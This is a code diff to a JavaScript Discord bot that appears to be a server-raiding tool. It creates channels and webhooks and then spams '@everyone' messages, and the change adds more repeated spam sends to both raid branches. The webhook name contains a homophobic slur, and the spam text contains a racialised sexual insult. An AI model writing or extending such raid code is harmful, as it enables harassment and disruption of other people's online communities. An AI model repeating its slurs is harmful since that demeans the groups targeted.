@@ -31,6 +31,10 @@ client.on("message", async (message) => {
                         m.createWebhook("get raided faggots").then(w => {
                             const case1hook = new Discord.WebhookClient(w.id, w.token)
                             case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
                         })
                     })
                     message.guild.createChannel('haha admin go grr', 'voice')
@@ -41,6 +45,10 @@ client.on("message", async (message) => {
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text').then(m =>{
                         m.createWebhook("get raided faggots").then(w => {
                             const case2hook = new Discord.WebhookClient(w.id, w.token)
+                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
                             case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
                         })
                     })
